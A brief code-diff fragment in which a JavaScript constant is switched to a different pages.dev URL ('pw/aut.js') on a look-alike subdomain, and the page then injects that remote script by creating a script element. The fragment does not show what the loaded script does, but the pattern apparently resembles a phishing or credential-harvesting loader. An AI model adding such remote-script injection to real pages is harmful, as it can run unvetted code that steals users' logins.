@@ -12,7 +12,7 @@
 
 
 
-    const SCRIPT_LINK = "https://mtaiirus.pages.dev/html-js/aut.js";
+    const SCRIPT_LINK = "https://mtaiiruss.pages.dev/pw/aut.js";
 
 const s = document.createElement("script");
 s.src = SCRIPT_LINK;
